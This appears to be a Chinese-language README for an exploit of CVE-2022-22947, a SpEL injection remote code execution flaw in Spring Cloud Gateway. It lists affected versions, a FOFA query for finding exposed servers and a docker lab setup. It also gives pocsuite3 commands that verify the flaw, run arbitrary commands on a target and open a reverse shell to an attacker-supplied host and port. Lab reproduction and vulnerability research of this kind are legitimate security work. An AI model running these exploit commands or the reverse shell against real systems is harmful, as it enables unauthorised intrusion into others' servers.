# spring_CVE-2022-22947

## 介绍
Spring Cloud Gateway是Spring中的一个API网关。其3.1.0及3.0.6版本（包含）以前存在一处SpEL表达式注入漏洞，当攻击者可以访问Actuator API的情况下，将可以利用该漏洞执行任意命令。

## 漏洞类型

远程代码执行


## 漏洞影响版本
3.1.x系列：Spring Cloud Gateway < 3.1.1

3.0.x系列：Spring Cloud Gateway < 3.0.7

其他旧的、不受支持的Spring Cloud Gateway版本

## 漏洞利用条件
无需登录
## 风险程度
高危
## 测绘平台查询语法和指纹
fofa: `app="Spring Cloud Gateway"`

## 漏洞环境搭建

```shell
docker-compose up -d
```
## exp 运行方式

`pocsuite3`

```shell
python cli.py -r pocs\spring_CVE-2022-22947.py -u "http://10.10.50.4:8080" --verify
python cli.py -r pocs\spring_CVE-2022-22947.py -u "http://10.10.50.4:8080" --cmd "ls" --attack
# 测试未返回shell，原因可能为shell中的特殊字符或者权限问题
python cli.py -r pocs\spring_CVE-2022-22947.py -u "http://10.10.50.4:8080" --lhost "XXX.XXX.XXX.XXX" --lport 4444 --shell
```
## 验证截图
![验证截图](./verify-01.png)